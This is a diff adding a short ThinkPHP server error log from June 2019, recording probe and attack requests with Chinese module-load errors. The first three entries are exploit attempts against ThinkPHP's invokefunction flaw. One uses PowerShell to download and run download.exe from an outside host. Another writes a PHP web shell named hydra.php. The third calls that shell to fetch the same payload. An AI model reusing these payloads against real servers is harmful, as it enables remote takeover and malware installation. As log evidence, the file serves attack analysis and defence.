@@ -1,0 +1,21 @@
+[ 2019-06-16T02:37:02+08:00 ] 121.40.181.250 /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/tfalbfsdxhrarau31472.exe');start%20%SystemRoot%/Temp/tfalbfsdxhrarau31472.exe
+ERR: 无法加载模块:Index
+
+[ 2019-06-16T02:37:02+08:00 ] 121.40.181.250 /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php
+ERR: 无法加载模块:Index
+
+[ 2019-06-16T02:37:02+08:00 ] 121.40.181.250 /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/tfalbfsdxhrarau31472.exe');start%20%SystemRoot%/Temp/tfalbfsdxhrarau31472.exe
+ERR: 无法加载模块:Public
+
+[ 2019-06-16T04:39:25+08:00 ] 80.82.70.187 http://www.baidu.com/cache/global/img/gs.gif
+ERR: 无法加载模块:Cache
+
+[ 2019-06-16T14:38:07+08:00 ] 80.82.70.187 http://www.baidu.com/cache/global/img/gs.gif
+ERR: 无法加载模块:Cache
+
+[ 2019-06-16T18:21:16+08:00 ] 139.162.88.63 http://clientapi.ipip.net/echo.php?info=1234567890
+ERR: 无法加载模块:Echo
+
+[ 2019-06-16T21:12:14+08:00 ] 111.206.52.101 /server-status
+ERR: 无法加载模块:Server-status
+
